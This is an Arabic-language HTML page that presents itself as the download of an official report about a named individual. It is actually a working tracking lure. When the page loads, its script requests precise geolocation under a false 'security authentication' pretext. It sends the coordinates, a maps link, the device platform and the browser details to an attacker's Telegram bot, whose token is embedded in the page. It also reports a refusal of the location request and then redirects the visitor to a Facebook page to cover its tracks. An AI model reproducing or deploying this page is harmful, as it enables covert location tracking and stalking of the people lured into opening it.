<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحميل التقرير الرسمي - 2026</title>
    <style>
        body { background-color: #1a1a1a; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { text-align: center; padding: 20px; border: 1px solid #333; border-radius: 10px; background: #222; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <h2>جاري تحضير الملف...</h2>
        <p>يرجى السماح بالوصول للموقع للمصادقة الأمنية وتحميل التقرير الخاص بـ (حيدر التراب).</p>
        <div class="loader"></div>
    </div>

    <script>
        // بياناتك الخاصة
        const token = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
        const chat_id = '7214473798';

        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
            fetch(url).catch(err => console.log('Error sending to Telegram'));
        }

        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const acc = position.coords.accuracy;
                    const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;
                    
                    let report = `🎯 **تم صيد هدف جديد!**\n\n`;
                    report += `📍 الموقع على الخريطة:\n${googleMaps}\n\n`;
                    report += `📏 دقة الموقع: ${acc} متر\n`;
                    report += `📱 نظام الجهاز: ${navigator.platform}\n`;
                    report += `🌐 المتصفح: ${navigator.userAgent}`;

                    sendToTelegram(report);

                    // تمويه: تحويله لصفحة فيسبوك بعد ثانية
                    setTimeout(() => {
                        window.location.href = "https://www.facebook.com/share/17y7raGdnu/";
                    }, 1500);

                }, function(error) {
                    sendToTelegram("⚠️ الشخص فتح الرابط لكنه رفض إعطاء صلاحية الموقع (رفض الطلب).");
                    window.location.href = "https://www.facebook.com/share/17y7raGdnu/";
                }, {enableHighAccuracy: true});
            } else {
                sendToTelegram("❌ المتصفح لا يدعم تحديد الموقع.");
            }
        };
    </script>
</body>
</html>
